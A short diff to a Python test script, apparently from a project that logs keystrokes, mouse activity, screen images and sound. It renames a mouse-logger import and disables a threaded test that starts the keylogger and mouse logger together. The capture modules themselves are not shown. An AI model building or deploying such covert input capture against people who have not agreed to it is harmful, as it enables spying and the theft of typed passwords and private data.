@@ -2,7 +2,7 @@ import keylog
 import time
 import getImage
 import getSound
-import mouselogger
+import Mouselogger
 
 def main():
 
@@ -10,12 +10,13 @@ def main():
     # test_mouselog(5)
     # test_getImage()
     # test_getSound(2)
-    test_threading(600)
+    # test_threading(600)
+    pass
 
 
 def test_threading(duration):
     klog = keylog.KeyLogger()
-    mlog = mouselogger.Mouselog()
+    mlog = Mouselogger.Mouselog()
     print("objets intanciés")
     klog.start()
     print("keylog lancé")
@@ -38,7 +39,7 @@ def test_keylog(waittime):
     # print(klog.keys)
 
 def test_mouselog(waittime):
-    mlog = mouselogger.Mouselog()
+    mlog = Mouselogger.Mouselog()
     mlog.start()
     time.sleep(waittime)
     mlog.stop()
